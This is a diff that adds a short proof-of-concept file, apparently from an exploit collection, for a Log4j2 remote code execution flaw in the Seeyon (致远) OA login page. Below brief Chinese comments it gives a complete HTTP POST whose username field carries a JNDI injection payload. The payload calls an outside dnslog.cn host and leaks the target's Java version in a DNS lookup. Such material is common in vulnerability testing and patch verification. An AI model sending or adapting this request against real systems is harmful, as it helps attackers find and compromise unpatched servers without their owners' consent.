@@ -1,0 +1,10 @@
+# 致远OA登录框处存在Log4j2漏洞
+# 致远OA登录框处存在log4j2远程代码执行漏洞，攻击者可以通过构造特定的恶意数据，将恶意的 JNDI 上下文传递给 Log4j2，从而触发远程代码执行漏洞。
+POST /seeyon/main.do?method=login&acid=80046261&bid=hd_tag_m8mv248f HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv248f
+RM-PRO-Token: b2b8d382e43548f1ccbd22831eb0a8e8
+RM-PRO-Time: 1742808369498
+User-Agent: curl/7.83.1
+
+login_username=${jndi:dns://${sys:java.version}.ujqqge.dnslog.cn}
